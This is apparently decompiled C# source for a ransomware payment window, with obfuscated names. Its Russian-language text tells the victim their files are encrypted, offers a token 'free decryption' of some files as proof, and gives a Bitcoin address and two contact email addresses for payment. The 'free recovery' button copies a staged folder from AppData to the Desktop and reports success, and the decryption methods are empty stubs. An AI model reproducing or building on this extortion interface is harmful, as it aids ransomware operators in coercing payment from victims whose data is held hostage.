using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using ns0;

namespace ns1;

public class registro : Form
{
	private IContainer icontainer_0 = null;

	private PictureBox btnMinimizar;

	private PictureBox btnCerrar;

	private Label label1;

	private Button btnlogin;

	private Label label2;

	private Label label8;

	private TextBox textBox1;

	private TextBox textBox2;

	private Label label9;

	private Label label10;

	private Label label4;

	public registro()
	{
		InitializeComponent();
	}

	private void btnMinimizar_Click(object sender, EventArgs e)
	{
		((Form)this).set_WindowState((FormWindowState)1);
	}

	private void btnCerrar_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void registro_MouseDown(object sender, MouseEventArgs e)
	{
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void registro_Load(object sender, EventArgs e)
	{
	}

	private void textBox2_TextChanged(object sender, EventArgs e)
	{
	}

	private void method_0(object sender, EventArgs e)
	{
	}

	private void btnlogin_Click(object sender, EventArgs e)
	{
		((Control)btnlogin).set_Cursor(Cursors.get_WaitCursor());
		Thread.Sleep(700);
		method_1();
		Thread.Sleep(100);
		((Control)btnlogin).set_Cursor(Cursors.get_Hand());
	}

	private void method_1()
	{
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		string text = "BascordApp";
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + "\\filesx0\\";
		string text3 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\filesx0\\";
		try
		{
			if (Directory.Exists(text3))
			{
				Directory.Delete(text3, recursive: true);
			}
			if (Directory.Exists(text2))
			{
				method_2(text2, text3);
				msgbox msgbox = new msgbox();
				((Control)msgbox).Hide();
				msgbox.changeLabel("Бесплатные файлы успешно расшифрованы!");
				((Form)msgbox).ShowDialog();
				((Component)(object)msgbox).Dispose();
				Process.Start(text3);
				if (Directory.Exists(text2))
				{
					Process.Start(text3);
				}
			}
			else
			{
				msgbox msgbox = new msgbox();
				((Control)msgbox).Hide();
				msgbox.changeLabel("Произошла ошибка. Пожалуйста, попробуйте еще раз или свяжитесь с нами по электронной почте");
				((Form)msgbox).ShowDialog();
				((Component)(object)msgbox).Dispose();
			}
		}
		catch
		{
			msgbox msgbox = new msgbox();
			((Control)msgbox).Hide();
			msgbox.changeLabel("Бесплатные файлы расшифрованы успешно!");
			((Form)msgbox).ShowDialog();
			((Component)(object)msgbox).Dispose();
			if (Directory.Exists(text2))
			{
				Process.Start(text3);
			}
		}
	}

	private void method_2(string string_0, string string_1)
	{
		if (!Directory.Exists(string_1))
		{
			Directory.CreateDirectory(string_1);
		}
		string[] files = Directory.GetFiles(string_0);
		string[] array = files;
		foreach (string text in array)
		{
			string fileName = Path.GetFileName(text);
			string destFileName = Path.Combine(string_1, fileName);
			File.Copy(text, destFileName);
		}
		string[] directories = Directory.GetDirectories(string_0);
		array = directories;
		foreach (string text2 in array)
		{
			string fileName = Path.GetFileName(text2);
			string destFileName = Path.Combine(string_1, fileName);
			method_2(text2, destFileName);
		}
	}

	public void DecryptAllFile(string string_0, string string_1)
	{
		File.ReadAllBytes(string_0);
		string extension = Path.GetExtension(string_0);
		string destFileName = string_0.Substring(0, string_0.Length - extension.Length);
		File.Move(string_0, destFileName);
	}

	public byte[] AES_Only_Decrypt_File(byte[] byte_0, byte[] byte_1)
	{
		byte[] result = null;
		_ = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (new MemoryStream())
		{
		}
		return result;
	}

	private void label10_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Expected O, but got Unknown
		//IL_01fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0208: Expected O, but got Unknown
		//IL_02ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0309: Expected O, but got Unknown
		//IL_03ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b7: Expected O, but got Unknown
		//IL_0452: Unknown result type (might be due to invalid IL or missing references)
		//IL_045c: Expected O, but got Unknown
		//IL_04fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0506: Expected O, but got Unknown
		//IL_05c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05cb: Expected O, but got Unknown
		//IL_067b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0685: Expected O, but got Unknown
		//IL_0703: Unknown result type (might be due to invalid IL or missing references)
		//IL_070d: Expected O, but got Unknown
		//IL_07ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c4: Expected O, but got Unknown
		//IL_0952: Unknown result type (might be due to invalid IL or missing references)
		//IL_095c: Expected O, but got Unknown
		//IL_0993: Unknown result type (might be due to invalid IL or missing references)
		//IL_099d: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(registro));
		btnMinimizar = new PictureBox();
		btnCerrar = new PictureBox();
		label1 = new Label();
		btnlogin = new Button();
		label2 = new Label();
		label8 = new Label();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		label9 = new Label();
		label10 = new Label();
		label4 = new Label();
		((ISupportInitialize)btnMinimizar).BeginInit();
		((ISupportInitialize)btnCerrar).BeginInit();
		((Control)this).SuspendLayout();
		btnMinimizar.set_Image((Image)componentResourceManager.GetObject("btnMinimizar.Image"));
		((Control)btnMinimizar).set_Location(new Point(768, 9));
		((Control)btnMinimizar).set_Name("btnMinimizar");
		((Control)btnMinimizar).set_Size(new Size(25, 25));
		btnMinimizar.set_SizeMode((PictureBoxSizeMode)3);
		btnMinimizar.set_TabIndex(11);
		btnMinimizar.set_TabStop(false);
		((Control)btnMinimizar).add_Click((EventHandler)btnMinimizar_Click);
		((Control)btnCerrar).set_BackColor(Color.FromArgb(15, 15, 15));
		btnCerrar.set_Image((Image)componentResourceManager.GetObject("btnCerrar.Image"));
		((Control)btnCerrar).set_Location(new Point(799, 9));
		((Control)btnCerrar).set_Name("btnCerrar");
		((Control)btnCerrar).set_Size(new Size(25, 25));
		btnCerrar.set_SizeMode((PictureBoxSizeMode)3);
		btnCerrar.set_TabIndex(10);
		btnCerrar.set_TabStop(false);
		((Control)btnCerrar).add_Click((EventHandler)btnCerrar_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(263, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(351, 29));
		((Control)label1).set_TabIndex(9);
		((Control)label1).set_Text("Как я могу получить пароль?");
		((Control)btnlogin).set_BackColor(Color.FromArgb(40, 40, 40));
		((Control)btnlogin).set_Cursor(Cursors.get_Hand());
		((ButtonBase)btnlogin).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)btnlogin).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(28, 28, 28));
		((ButtonBase)btnlogin).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(64, 64, 64));
		((ButtonBase)btnlogin).set_FlatStyle((FlatStyle)0);
		((Control)btnlogin).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnlogin).set_ForeColor(Color.LightGray);
		((Control)btnlogin).set_Location(new Point(181, 398));
		((Control)btnlogin).set_Name("btnlogin");
		((Control)btnlogin).set_Size(new Size(480, 40));
		((Control)btnlogin).set_TabIndex(19);
		((Control)btnlogin).set_Text("Восстановить некоторые файлы бесплатно");
		((ButtonBase)btnlogin).set_UseVisualStyleBackColor(false);
		((Control)btnlogin).add_Click((EventHandler)btnlogin_Click);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(16, 50));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(825, 192));
		((Control)label2).set_TabIndex(20);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(Color.White);
		((Control)label8).set_Location(new Point(16, 248));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(207, 27));
		((Control)label8).set_TabIndex(26);
		((Control)label8).set_Text("Наш биткойн-адрес:");
		((Control)textBox1).set_BackColor(Color.FromArgb(15, 15, 15));
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)1);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(Color.White);
		((Control)textBox1).set_Location(new Point(222, 245));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(602, 30));
		((Control)textBox1).set_TabIndex(27);
		((Control)textBox1).set_Text("bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0");
		textBox1.set_TextAlign((HorizontalAlignment)2);
		((Control)textBox2).set_BackColor(Color.FromArgb(15, 15, 15));
		((TextBoxBase)textBox2).set_BorderStyle((BorderStyle)1);
		((Control)textBox2).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_ForeColor(Color.White);
		((Control)textBox2).set_Location(new Point(222, 281));
		((TextBoxBase)textBox2).set_Multiline(true);
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(602, 30));
		((Control)textBox2).set_TabIndex(29);
		((Control)textBox2).set_Text("ramilo2122@yandex.com   or   4lok3r@tutanota.com");
		textBox2.set_TextAlign((HorizontalAlignment)2);
		((Control)textBox2).add_TextChanged((EventHandler)textBox2_TextChanged);
		((Control)label9).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_ForeColor(Color.White);
		((Control)label9).set_Location(new Point(16, 284));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(200, 27));
		((Control)label9).set_TabIndex(28);
		((Control)label9).set_Text("Электронная почта:");
		((Control)label10).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_ForeColor(Color.White);
		((Control)label10).set_Location(new Point(16, 316));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(808, 79));
		((Control)label10).set_TabIndex(30);
		((Control)label10).set_Text("Перед оплатой вы можете бесплатно восстановить несколько файлов. Учтите, что он не расшифрует все ваши файлы. Это доказывает, что все ваши файлы можно расшифровать");
		((Control)label10).add_Click((EventHandler)label10_Click);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_CausesValidation(false);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)4, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.DarkGray);
		((Control)label4).set_Location(new Point(12, 37));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(820, 13));
		((Control)label4).set_TabIndex(22);
		((Control)label4).set_Tag((object)"         ");
		((Control)label4).set_Text(componentResourceManager.GetString("label4.Text"));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(15, 15, 15));
		((Form)this).set_ClientSize(new Size(842, 450));
		((Control)this).get_Controls().Add((Control)(object)label10);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label9);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)btnlogin);
		((Control)this).get_Controls().Add((Control)(object)btnMinimizar);
		((Control)this).get_Controls().Add((Control)(object)btnCerrar);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("registro");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Восстановить файлы");
		((Form)this).add_Load((EventHandler)registro_Load);
		((Control)this).add_MouseDown(new MouseEventHandler(registro_MouseDown));
		((ISupportInitialize)btnMinimizar).EndInit();
		((ISupportInitialize)btnCerrar).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
